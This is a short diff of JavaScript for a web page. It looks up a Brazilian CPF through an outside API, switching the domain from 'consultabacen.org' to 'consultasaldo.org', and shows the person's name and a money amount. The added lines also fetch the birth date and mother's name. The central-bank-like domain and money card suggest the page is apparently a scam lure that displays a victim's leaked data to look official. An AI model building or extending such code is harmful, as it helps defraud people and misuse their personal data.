@@ -202,11 +202,13 @@ if(valor) document.getElementById('cardValor').textContent = 'R$ ' + valor;
 
 // Busca API
 if(cpf && !nome){
-  fetch('https://consultabacen.org/wp-json/cpf/v1/consultar?cpf='+cpf)
+  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf='+cpf)
     .then(function(r){return r.json();})
     .then(function(d){
       if(d.nome){ document.getElementById('cardNome').textContent = d.nome.toUpperCase(); nome=d.nome; }
       if(d.valor){ document.getElementById('cardValor').textContent = 'R$ '+d.valor; valor=d.valor; }
+      if(d.nascimento && !nasc){ nasc = d.nascimento; }
+      if(d.nome_mae && !mae){ mae = d.nome_mae; }
     }).catch(function(){});
 }
 
